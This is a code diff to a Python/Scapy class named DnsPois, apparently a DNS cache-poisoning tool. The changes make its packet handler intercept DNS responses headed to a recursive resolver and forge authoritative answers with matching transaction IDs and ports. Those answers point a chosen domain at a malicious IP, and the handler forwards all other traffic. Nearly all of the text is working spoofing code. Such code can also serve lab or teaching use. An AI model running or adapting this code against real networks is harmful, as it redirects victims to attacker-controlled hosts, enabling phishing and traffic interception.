@@ -27,8 +27,6 @@ class DnsPois:
         """
 
         def forward(pkt):
-            print("FORWARDED PACKETS")
-            pkt.show()
             send(pkt, verbose=0)
 
         """
@@ -40,15 +38,17 @@ class DnsPois:
         def get_resp(pkt):
 
             if poison_vic:
-                if DNS in pkt and str(pkt[IP].src) == rec_ip and str(pkt[IP].dst) == auth_ip:
+                if DNS in pkt and str(pkt[IP].src) == auth_ip and str(pkt[IP].dst) == rec_ip and pkt.haslayer(UDP):
                     if domain in str(pkt['DNS Question Record'].qname):
-                        malformed_pkt = pkt
-                        malformed_pkt[DNSRR].rdata = mal_ip
-
-                        forward(malformed_pkt)
-                        return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
+                        spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+                                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                       an=(DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=mal_ip)))
+                        send(spf_resp, verbose=0)
                     else:
                         return forward(pkt)
+                else:
+                    return forward(pkt)
             elif not poison_vic:
                 if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                         str(pkt[IP].dst) == auth_ip:
@@ -64,7 +64,8 @@ class DnsPois:
                         return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
                     else:
                         return forward(pkt)
-
+                else:
+                    return forward(pkt)
             else:
                 return forward(pkt)
 
